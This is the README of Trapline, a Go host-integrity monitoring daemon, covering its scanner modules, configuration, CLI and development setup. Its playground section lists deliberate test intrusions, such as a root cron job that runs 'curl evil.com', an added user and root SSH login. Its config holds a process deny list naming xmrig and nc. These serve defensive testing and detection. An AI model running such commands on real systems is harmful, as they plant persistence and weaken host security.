<p align="center">
  <img src="trapline.png" alt="Trapline" width="400">
</p>

<h1 align="center">Trapline</h1>

<p align="center">
  <strong>A lightweight, modular host integrity and security monitoring daemon written in Go.</strong>
</p>

Trapline replaces Tripwire with something that actually helps. It runs continuously, watches what matters, ignores what doesn't, and reports cleanly to structured logging. No database rebuilds. No passphrase-protected policy files. No 4,000-line email diffs.

The name: a trapline is a route a trapper walks regularly, checking each trap along the way. That's what this does — walks a defined route across your system, checking each point for something wrong.

> This project was vibe coded with [Claude Code](https://claude.ai/claude-code).

---

## Install

One command:

```bash
curl -sSL https://raw.githubusercontent.com/jclement/trapline/main/install.sh | sudo bash
```

Or manually — download the binary and run the installer yourself:

```bash
curl -sL https://github.com/jclement/trapline/releases/latest/download/trapline_linux_amd64 -o trapline && chmod +x trapline
sudo ./trapline install
```

The binary *is* the installer. `trapline install` copies itself to `/usr/local/bin`, creates config directories, writes a default config, installs the systemd unit, enables the service, and captures initial baselines. Done.

```
$ sudo ./trapline install
Installing trapline v0.1.0 ...
  ✓ Binary installed to /usr/local/bin/trapline
  ✓ Directories created
  ✓ Config written to /etc/trapline/trapline.yml
  ✓ Systemd unit installed
  ✓ Apt hook installed
  ✓ Service enabled
  ✓ Service started

Trapline v0.1.0 is installed. Check status with: trapline status
```

Uninstall is just as clean:

```bash
sudo trapline uninstall           # removes everything
sudo trapline uninstall --keep-config  # preserves /etc/trapline/
```

---

## What It Watches

Trapline ships with 13 scanner modules. Each runs independently on its own schedule.

| Module | What it does | Default interval |
|---|---|---|
| **file-integrity** | SHA-256 hashes of critical files (`/etc/passwd`, `sshd_config`, sudoers, etc.) | 5m |
| **packages** | `dpkg --verify` — detects files modified outside the package manager | 1h |
| **ports** | Monitors listening TCP/UDP ports via `/proc/net/tcp` | 60s |
| **processes** | Process allowlist/denylist with resource monitoring | 30s |
| **users** | User accounts, groups, sudoers, authorized_keys | 15m |
| **containers** | Docker container inventory via the Docker socket | 60s |
| **cron** | Cron jobs across all sources (crontab, cron.d, user crontabs) | 15m |
| **suid** | SUID/SGID binary detection | 1h |
| **ssh** | `sshd_config` security validation | 15m |
| **permissions** | World-writable files, bad ownership, shadow file permissions | 1h |
| **rootkit** | Kernel module baselining, hidden files, /dev anomalies, promiscuous NICs, deleted-exe processes | 30m |
| **malware** | Smart ClamAV integration — only scans new/modified files in high-risk dirs | 15m |
| **network** | Outbound connection monitoring with process correlation — baselines known remote IPs, identifies owning process, supports process allowlisting (disabled by default) | 60s |

### How It Avoids Tripwire's Noise

- **Package-manager-aware.** If `apt` installed it, it's not suspicious. The `packages` module uses `dpkg --verify` — after `apt upgrade`, no findings. Only files changed *outside of apt* are flagged.
- **Specific, not exhaustive.** Watches ~50-100 specific files, not entire `/usr/lib` trees.
- **Automatic rebaseline.** An apt hook (`/etc/apt/apt.conf.d/99trapline`) rebaselines after package operations. Ansible deploys end with `trapline rebaseline`. No manual database rebuilds.
- **Cooldown deduplication.** Same finding isn't emitted again within a configurable window (default 1h). You don't get 500 identical alerts every day.

---

## CLI

```bash
# Lifecycle
trapline install              # install binary, config, systemd unit, start
trapline uninstall            # stop service, remove everything
trapline update               # check for and apply updates from GitHub
trapline doctor               # validate installation health

# Operations
trapline run                  # start daemon (foreground, for systemd)
trapline status               # show module status
trapline scan                 # run all modules once, print results, exit
trapline scan --module ports  # run one module
trapline rebaseline           # capture current state as known-good
trapline findings             # list active findings (JSON)
trapline findings --format table

# Configuration
trapline config check         # validate config
trapline config show          # dump effective config

# Info
trapline version              # print version, commit, build date
trapline version --json
```

All commands support `--config /path/to/trapline.yml` and `--quiet` / `--verbose`.

Exit codes: `0` = clean, `1` = findings present, `2` = config error, `3` = runtime error.

---

## Configuration

Config lives at `/etc/trapline/trapline.yml`. Hot-reloaded on change (SIGHUP).

```yaml
state_dir: /var/lib/trapline

output:
  console:
    enabled: true
    format: json          # json | text
    level: warn
  file:
    enabled: true
    path: /var/log/trapline/trapline.log
    format: json
    level: info
    max_size_mb: 50
  tcp:
    enabled: true
    address: 127.0.0.1:51888    # Fluent Bit
    format: json
    level: info
  webhook:
    enabled: false
    url: ""                      # Teams/Slack incoming webhook
    level: high
    cooldown: 1h

update:
  enabled: true
  repo: jclement/trapline
  channel: stable
  check_interval: 6h
  auto_apply: true

defaults:
  interval: 5m
  cooldown: 1h

modules:
  file-integrity:
    enabled: true
    interval: 5m
    watch_extra:
      - /docker/*/docker-compose.yml
      - /usr/local/bin/*
  packages:
    enabled: true
    interval: 1h
  ports:
    enabled: true
    interval: 60s
  processes:
    enabled: true
    interval: 30s
    exclude:                    # glob patterns for process names to ignore (default: ["kworker/*"])
      - "kworker/*"
      - "kthreadd"
    deny:
      - name: xmrig
      - name: nc
        min_uptime: 300
  containers:
    enabled: true
    interval: 60s
  users:
    enabled: true
    interval: 15m
  cron:
    enabled: true
    interval: 15m
  suid:
    enabled: true
    interval: 1h
  ssh:
    enabled: true
    interval: 15m
    # allowed_users:              # optional: alert CRITICAL on SSH sessions by users not in this list
    #   - admin
    #   - deploy
  permissions:
    enabled: true
    interval: 1h
  rootkit:
    enabled: true
    interval: 30m
  malware:
    enabled: true
    interval: 15m
    # watch_dirs:                # override default high-risk paths
    #   - /tmp
    #   - /var/tmp
    #   - /dev/shm
  network:
    enabled: false                  # disabled by default — noisy on systems with Docker/dynamic outbound traffic
    interval: 60s
    allowed_processes:              # connections from these processes are silently ignored
      - apt
      - dpkg
      - freshclam
```

---

## Output & Findings

Every finding is a structured JSON event:

```json
{
  "timestamp": "2026-03-26T14:32:01.883Z",
  "hostname": "nyc1",
  "module": "file-integrity",
  "finding_id": "file-modified:/etc/ssh/sshd_config",
  "severity": "high",
  "status": "new",
  "summary": "sshd_config modified outside of package manager",
  "detail": {
    "path": "/etc/ssh/sshd_config",
    "baseline_hash": "a1b2c3d4...",
    "current_hash": "e5f6a7b8..."
  },
  "trapline_version": "0.1.0",
  "scan_id": "a7f3b291"
}
```

**Severity levels:**

| Level | Meaning | Examples |
|---|---|---|
| `critical` | Active compromise indicators | unexpected SUID in /tmp, sshd replaced outside apt, new UID-0 user |
| `high` | Security-relevant changes | sshd_config modified, new listening port, sudoers changed |
| `medium` | Notable changes, possibly legitimate | new cron job, container image updated, user shell changed |
| `info` | Informational | rebaseline completed, config reloaded |

**Output sinks:**
- **Console** (stdout) — captured by systemd journal
- **File** — rotated JSON log
- **TCP** — for Fluent Bit / Axiom (`Trapline -> TCP:51888 -> Fluent Bit -> Axiom`)
- **Webhook** — Teams/Slack notifications for critical findings

---

## Self-Update

Trapline checks GitHub Releases for new versions and updates itself:

```bash
trapline update --check    # just check
trapline update            # download and apply
```

Updates are verified with SHA-256 checksums. Release binaries are signed with cosign via GitHub Actions OIDC (keyless Sigstore). The old binary is preserved at `/usr/local/bin/trapline.bak` for rollback. Major version bumps require `--allow-major`.

---

## Doctor

`trapline doctor` validates the entire installation:

```
$ sudo trapline doctor
Trapline Doctor — checking installation health...

Binary
  ✓ Binary at /usr/local/bin/trapline (v0.1.0)
  ✓ Running as root

Config
  ✓ Config file exists at /etc/trapline/trapline.yml
  ✓ Config is valid YAML
  ✓ Config permissions 0600

Systemd
  ✓ Unit file at /usr/lib/systemd/system/trapline.service
  ✓ Service is enabled
  ✓ Service is active (running)

Directories
  ✓ /etc/trapline exists (0700)
  ✓ /var/lib/trapline exists (0700)
  ✓ /var/lib/trapline/baselines exists (0700)
  ✓ /var/log/trapline exists (0750)

Baselines
  ✓ 10 baseline files

Output
  ✓ TCP sink at 127.0.0.1:51888 reachable

Apt
  ✓ Apt hook at /etc/apt/apt.conf.d/99trapline

Summary: 15 passed, 0 warnings, 0 errors
```

---

## Architecture

```
trapline (single binary)
├── cmd/trapline/          # CLI entrypoint
├── internal/
│   ├── config/            # YAML config loader, defaults, validation
│   ├── baseline/          # Baseline state management (JSON on disk)
│   ├── engine/            # Module scheduler, lifecycle, scan orchestration
│   ├── output/            # Output sinks (stdout, file, tcp, webhook)
│   ├── updater/           # Self-update from GitHub releases
│   ├── install/           # Install, uninstall, doctor
│   └── modules/
│       ├── fileintegrity/ # File hash monitoring
│       ├── packages/      # dpkg --verify
│       ├── ports/         # Listening port monitoring
│       ├── processes/     # Process allowlist/denylist
│       ├── users/         # User/group/sudoers monitoring
│       ├── containers/    # Docker container inventory
│       ├── cron/          # Cron job monitoring
│       ├── suid/          # SUID/SGID binary detection
│       ├── ssh/           # sshd_config validation
│       ├── permissions/   # Filesystem permission checks
│       ├── rootkit/       # Rootkit indicator detection
│       ├── malware/       # ClamAV integration (smart scanning)
│       └── network/       # Outbound connection monitoring
├── pkg/
│   └── finding/           # Shared Finding type, severity levels
└── e2e/                   # Docker-based end-to-end tests
```

Every scanner module implements a single interface:

```go
type Module interface {
    Name() string
    Init(cfg ModuleConfig) error
    Scan(ctx context.Context) ([]finding.Finding, error)
    Rebaseline(ctx context.Context) error
}
```

Modules run in independent goroutines. A slow module (SUID scan on a large filesystem) doesn't block fast modules (port check every 30s).

**Dependencies are minimal:**
- `gopkg.in/yaml.v3` — config parsing
- Standard library for everything else (crypto, net, os, encoding/json)

No CGO. Static binary. Cross-compiles for amd64/arm64.

---

## Development

### Prerequisites

[mise](https://mise.jdx.dev/) manages all tooling. One command:

```bash
mise install
```

### Build & Test

```bash
mise run build              # build for current platform
mise run build-linux        # cross-compile for linux
mise run test               # unit tests (fast, runs anywhere)
mise run lint               # golangci-lint
mise run test-e2e           # Docker e2e tests (requires Docker)
mise run snapshot           # goreleaser local build
```

### Developing on macOS, Targeting Linux

Trapline is Linux-only (reads `/proc`, uses systemd, calls `dpkg`). Development on macOS works because:

- **Unit tests** run anywhere — all Linux-specific reads are behind interfaces, faked in tests
- **E2E tests** run in Docker — real Ubuntu containers, real `/proc`, real `dpkg`
- **Build** cross-compiles with `CGO_ENABLED=0 GOOS=linux`

### E2E Tests

17 tests that spin up Ubuntu 24.04 containers and verify real behavior:

```bash
mise run test-e2e
```

Tests cover: version/config commands, baseline capture, detecting new users, modified `/etc/passwd`, new cron jobs, SSH config changes, sudoers modifications, new SUID binaries, new listening ports, rebaseline resolving findings, multi-change detection, findings output formats.

### Playground

Interactive Ubuntu environment for manual testing:

```bash
mise run playground
```

This cross-compiles the binary, drops it into a fresh Ubuntu container with aggressive scan intervals (5-10s), and starts a TCP sink that prints findings to stdout.

```bash
# Shell into the playground
docker exec -it trapline-playground bash

# Watch findings stream in (another terminal)
docker logs -f trapline-playground-sink

# Break things and watch trapline react:
useradd -m hacker                                    # user-added in ~10s
echo "* * * * * root curl evil.com" > /etc/cron.d/x  # cron-added
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config    # ssh-insecure-setting
python3 -m http.server 8080 &                         # port-new in ~5s

# Tear down
mise run playground-down
```

### CI/CD

- **CI** (every push/PR): lint, unit tests — via GitHub Actions + `jdx/mise-action`
- **Release** (on `v*` tags): goreleaser builds linux/amd64 + linux/arm64, cosign signs via Sigstore keyless (GitHub Actions OIDC), creates GitHub release

```bash
git tag v0.1.0
git push origin v0.1.0
# GitHub Actions handles the rest
```

Release assets:
```
trapline_linux_amd64        (~8-12 MB static binary)
trapline_linux_arm64        (~8-12 MB static binary)
checksums.txt               (SHA-256)
checksums.txt.sig           (cosign keyless signature)
checksums.txt.pem           (Fulcio certificate)
```

---

## Ansible Integration

```yaml
# Deploy trapline
- name: Download trapline
  get_url:
    url: "https://github.com/jclement/trapline/releases/latest/download/trapline_linux_amd64"
    dest: /usr/local/bin/trapline
    mode: "0755"

- name: Install trapline
  command: trapline install --no-start
  args:
    creates: /usr/lib/systemd/system/trapline.service

- name: Deploy trapline config
  template:
    src: trapline.yml.j2
    dest: /etc/trapline/trapline.yml
    mode: "0600"
  notify: restart trapline

- name: Start trapline
  systemd:
    name: trapline
    state: started
    enabled: true

# At end of playbook:
- name: Rebaseline trapline after deploy
  command: trapline rebaseline
  tags: ["trapline"]
```

After the first install, `trapline update` handles binary updates itself.

---

## License

MIT
